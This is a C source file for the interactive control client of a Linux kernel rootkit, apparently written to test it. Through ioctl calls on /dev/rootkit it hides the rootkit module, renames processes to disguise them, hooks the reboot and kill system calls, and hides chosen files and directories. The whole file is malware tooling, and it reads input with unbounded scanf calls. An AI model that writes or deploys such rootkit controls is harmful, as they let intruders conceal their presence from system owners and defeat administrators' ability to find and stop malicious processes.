#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include "rootkit.h"

int main(int argc, char **argv)
{
    int fd;
    
    fd = open("/dev/rootkit", O_RDWR);
    if(fd < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    
    // test rootkit functionality
    while(1) {
        printf("Enter a command from the following: \n");
        printf("1. Hide/Show rootkit\n");
        printf("2. Masquerade process names\n");
        printf("3. Hook reboot and kill system calls\n");
        printf("4. Hide files/directories\n");
        printf("5. Exit\n");
        printf(">>> ");

        int choice;
        scanf("%d", &choice);
        switch(choice) {
            case 1:
                ioctl(fd, IOCTL_MOD_HIDE);
                break;
            case 2:
                {
                    int req_len, i;
                    struct masq_proc_req req;
                    // struct masq_proc *list;
                    printf("Enter the number of processes to be masqueraded\n");
                    scanf("%d", &req_len);
                    req.len = req_len;

                    req.list = (struct masq_proc *)malloc(sizeof(struct masq_proc) * req_len);
                    if(req.list == NULL) {
                        perror("malloc");
                        exit(EXIT_FAILURE);
                    }
                    for(i = 0; i < req.len; i++){
                        printf("Enter the original name and new name of the process\n");
                        printf("Original name: ");
                        scanf("%s", req.list[i].orig_name);
                        printf("New name: ");
                        scanf("%s", req.list[i].new_name);
                    }
                    ioctl(fd, IOCTL_MOD_MASQ, &req);
                    free(req.list);
                }
                break;
            case 3:
                ioctl(fd, IOCTL_MOD_HOOK);
                break;
            case 4:
                {
                    struct hided_file req;
                    printf("Enter the file/directory name to hide: ");
                    scanf("%s", req.name);
                    req.len = strlen(req.name);
                    ioctl(fd, IOCTL_FILE_HIDE, &req);
                }
                break;
            case 5:
                close(fd);
                exit(EXIT_SUCCESS);
                break;
            default:
                printf("Invalid choice\n");
                break;
        }
    }

    return 0;
}
